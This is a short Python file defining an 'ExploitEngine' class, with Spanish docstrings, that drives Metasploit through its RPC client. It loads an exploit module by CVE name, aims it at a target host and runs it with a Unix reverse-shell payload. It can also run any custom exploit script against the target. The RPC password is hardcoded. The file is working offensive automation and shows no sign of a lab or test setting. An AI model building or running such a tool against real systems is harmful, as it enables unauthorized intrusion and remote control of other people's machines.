import subprocess
from metasploit.msfrpc import MsfRpcClient

class ExploitEngine:
    def __init__(self, cve=None, target=None):
        self.cve = cve
        self.target = target
        self.client = MsfRpcClient(password='msfpassword')

    def run_metasploit_exploit(self):
        """Ejecuta un exploit de Metasploit automáticamente."""
        exploit = self.client.modules.use('exploit', self.cve)
        exploit['RHOSTS'] = self.target
        exploit.execute(payload='cmd/unix/reverse')

    def custom_exploit(self, script_path):
        """Ejecuta un exploit personalizado (ej: en Python/Bash)."""
        try:
            subprocess.run([script_path, self.target], check=True)
        except subprocess.CalledProcessError:
            raise Exception("Exploit falló")
